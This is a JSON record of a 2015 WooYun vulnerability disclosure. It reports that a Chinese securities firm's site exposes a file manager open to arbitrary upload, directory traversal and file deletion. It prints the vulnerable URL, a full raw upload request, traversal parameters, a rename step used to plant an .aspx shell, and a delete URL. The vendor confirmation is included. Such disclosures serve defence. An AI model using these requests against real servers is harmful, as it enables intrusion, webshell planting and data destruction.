{"id": 72788, "wybug_id": "wooyun-2015-0158259", "wybug_title": "开源证券主站存在任意文件上传\\目录遍历\\文件删除漏洞", "wybug_corp": "开源证券股份有限公司", "wybug_author": "路人甲", "wybug_date": "2015-12-04 15:20", "wybug_open_date": "2016-01-20 15:50", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-20：\t细节向公众公开  简要描述： 主站任意文件上传、目录遍历、文件删除漏洞，求20rank可好 详细说明：  主站\n\n问题文件\nhttp://www.kysec.cn/qk/tools/Main.aspx\n\n\n通过该文件管理，你可以遍历\nhttp://www.kysec.cn/qk/tools/main.aspx?path=/../\n\n\n\n\n自己控制path参数，页面上操作经常把路径弄错   漏洞证明：  上传\nhttp://www.kysec.cn/qk/tools/Main.aspx\n\nPOST http://www.kysec.cn/qk/tools/Main.aspx?act=upload&path=/../../ HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://www.kysec.cn/qk/tools/main.aspxAccept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Content-Type: multipart/form-data; boundary=---------------------------7df373a190f2eUA-CPU: AMD64Accept-Encoding: gzip, deflateConnection: Keep-AliveContent-Length: 109652Host: www.kysec.cnPragma: no-cacheCookie: ASP.NET_SessionId=puigaa453f0fbnijb2j4iwrs; IESESSION=alive; CheckCode=49189; Hm_lvt_3769cd6b3049c7525de0689b8999d647=1449191375; Hm_lpvt_3769cd6b3049c7525de0689b8999d647=1449191375; Hm_lvt_23d8bc8b6e07fd4ea07b6ec4e368508e=1449191375; Hm_lpvt_23d8bc8b6e07fd4ea07b6ec4e368508e=1449191375; pgv_pvi=3243404288; pgv_si=s9492864000-----------------------------7df373a190f2eContent-Disposition: form-data; name=\"fileUpload\"; filename=\"C:\\Users\\Administrator\\Desktop\\01.jpg\"Content-Type: image/pjpegwooyun test-----------------------------7df373a190f2eContent-Disposition: form-data; name=\"btnUpload\"添加-----------------------------7df373a190f2e--\n上传只能传jpg等合法的文件，但是该系统给了我们一个强大的功能，重命名\n\n\n\n\n\n在页面上执行完rename，页面会跳转到path=/qk/allFiles/../../不要在意，我们继续把path改回/../../删除也是一样的道理，他都会跳转，但此时他没删除，我们要手动\nhttp://www.kysec.cn/qk/tools/Main.aspx?act=delete&path=/../../&file=20151241420710.aspx&type=file\n\n\n删掉了\n\n\n\n\n\n\n\n\n\n留个文本证明我来过http://www.kysec.cn/wooyun.txt\n\n   修复方案：  权限控制，shell我已经自杀了，求20rank   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-12-06 15:48 厂商回复： 确认漏洞存在，感谢@路人甲 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}